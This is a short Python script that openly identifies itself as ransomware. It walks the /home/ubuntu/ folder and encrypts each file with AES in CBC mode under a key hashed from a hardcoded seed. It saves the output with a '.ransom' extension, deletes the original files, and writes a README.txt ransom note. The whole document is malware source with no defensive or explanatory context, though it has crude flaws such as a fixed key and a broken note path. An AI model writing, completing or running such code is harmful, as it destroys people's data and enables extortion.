import os ,random, struct
from random import randint
from Crypto.Cipher import AES
from Crypto.Hash import SHA256

path = [ "/home/ubuntu/" ] #path of our target folder

def notification():
    note = "Hi, this is a ransomware and I have encrypted your files."
    value = "home/ubuntu/"
    print(value)
    desktop_dir = os.getenv('HOME') #for windows, for unix is 'HOME'
    outputfile = desktop_dir + "README.txt"
    handler = open(outputfile,'w')
    handler.write(note)
    handler.close()

def encrypt_file(key, in_filename, out_filename=None, chunksize=64*1024):
    """ Encrypts a file using AES (CBC mode) with the
        given key.

        key:
            The encryption key - a string that must be
            either 16, 24 or 32 bytes long. Longer keys
            are more secure.

        in_filename:
            Name of the input file

        out_filename:
            If None, '<in_filename>.enc' will be used.

        chunksize:
            Sets the size of the chunk which the function
            uses to read and encrypt the file. Larger chunk
            sizes can be faster for some files and machines.
            chunksize must be divisible by 16.
    """
    if not out_filename:
        out_filename = in_filename + '.ransom'

    iv = ''.join(chr(random.randint(0, 0xFF)) for i in range(16))
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    filesize = os.path.getsize(in_filename)

    with open(in_filename, 'rb') as infile:
        with open(out_filename, 'wb') as outfile:
            outfile.write(struct.pack('<Q', filesize))
            outfile.write(iv)

            while True:
                chunk = infile.read(chunksize)
                if len(chunk) == 0:
                    break
                elif len(chunk) % 16 != 0:
                    chunk += ' ' * (16 - len(chunk) % 16)

                outfile.write(encryptor.encrypt(chunk))
                
    os.unlink(in_filename) 
              

notification()
for paths in path:
    for root, dirs, files in os.walk(paths):
        for names in files:
            print (names+'\r')
            print (root+'\r')
            encrypt_file(SHA256.new("this_is_the_seed").digest(),str(os.path.join(root,names)))
